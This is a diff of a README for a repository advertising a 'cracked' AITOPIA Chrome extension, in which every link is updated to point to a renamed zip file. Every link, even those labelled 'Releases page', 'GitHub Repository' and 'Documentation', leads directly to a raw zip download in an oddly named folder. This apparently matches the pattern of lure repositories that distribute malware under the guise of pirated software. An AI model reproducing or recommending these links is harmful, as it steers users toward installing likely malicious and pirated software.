@@ -1,6 +1,6 @@
 # 🌟 AITOPIA-Chrome-Extension-Cracked - Chat with Top AI Models Effortlessly
 
-[![Download AITOPIA](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip)](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip)
+[![Download AITOPIA](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip)](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the AITOPIA Chrome Extension! This extension allows you to chat with 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip) to download the latest version of the extension.
+   Go to our [Releases page](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip) to download the latest version of the extension.
 
 2. **Select the Latest Release**
    On the Releases page, find the most recent version. This will typically be at the top of the list. 
@@ -61,9 +61,9 @@ Feel free to report any bugs or suggest features on the Issues page of our repos
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip)
-- [Releases Page](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip)
-- [Documentation](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/AITOPIA-Chrome-Extension-Cracked.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/omernizam/AITOPIA-Chrome-Extension-Cracked/main/histomorphologically/Extension-Chrome-AITOPI-Cracked-v2.6.zip)
 
 ## 👥 Community
 
